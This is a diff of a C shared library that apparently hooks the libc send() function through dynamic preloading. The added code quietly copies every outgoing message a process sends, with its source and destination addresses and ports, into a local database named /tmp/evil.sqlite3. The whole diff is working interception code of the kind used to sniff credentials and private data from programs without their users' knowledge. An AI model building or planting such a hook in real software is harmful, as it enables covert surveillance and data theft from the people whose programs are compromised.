@@ -35,16 +35,62 @@
 
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#include <sqlite3.h>
 
 static void log_packet(int, const void *, size_t);
 
 ssize_t (*orig_send)(int, const void *, size_t, int);
 
+sqlite3 *db;
+
 static void
 log_packet(int s, const void *msg, size_t len)
 {
-	printf("Socket %d sending msg of size %zu\n", s, len);
-	printf("%s\n", msg);
+	struct sockaddr_in dst, src;
+	char dstip[16], srcip[16];
+	sqlite3_stmt *stmt;
+	const char **tail;
+	socklen_t socklen;
+	int err;
+
+	if (db == NULL) {
+		return;
+	}
+
+	memset(&src, 0, sizeof(src));
+	memset(&dst, 0, sizeof(dst));
+
+	socklen = sizeof(src);
+	if (getsockname(s, (struct sockaddr *)&src, &socklen)) {
+		return;
+	}
+	inet_ntoa_r(src.sin_addr, srcip, socklen);
+
+	socklen = sizeof(dst);
+	if (getpeername(s, (struct sockaddr *)&dst, &socklen)) {
+		return;
+	}
+	inet_ntoa_r(dst.sin_addr, dstip, socklen);
+
+	stmt = NULL;
+	err = sqlite3_prepare(db, "insert into entries "
+	    "(srcip, srcport, dstip, dstport, payload) values "
+	    "(?, ?, ?, ?, ?)", -1, &stmt, NULL);
+	if (err != SQLITE_OK) {
+		return;
+	}
+
+	sqlite3_bind_text(stmt, 1, srcip, -1, SQLITE_STATIC);
+	sqlite3_bind_int(stmt, 2, ntohs(src.sin_port));
+	sqlite3_bind_text(stmt, 3, dstip, -1, SQLITE_STATIC);
+	sqlite3_bind_int(stmt, 4, ntohs(dst.sin_port));
+	sqlite3_bind_text(stmt, 5, msg, len, SQLITE_STATIC);
+
+	sqlite3_step(stmt);
+	sqlite3_finalize(stmt);
 }
 
 ssize_t
@@ -79,6 +125,7 @@ __attribute__((constructor)) void
 init(void)
 {
 	void *handle;
+	int err;
        
 	handle = dlopen("/lib/libc.so.7",
 	    RTLD_GLOBAL | RTLD_LAZY);
@@ -89,5 +136,18 @@ init(void)
 	orig_send = dlsym(handle, "send");
 	if (orig_send == NULL) {
 		exit(1);
+	}
+
+	err = sqlite3_open("/tmp/evil.sqlite3", &db);
+	if (err != SQLITE_OK) {
+		exit(1);
+	}
+}
+
+__attribute__((destructor)) void
+fini(void)
+{
+	if (db != NULL) {
+		sqlite3_close(db);
 	}
 }
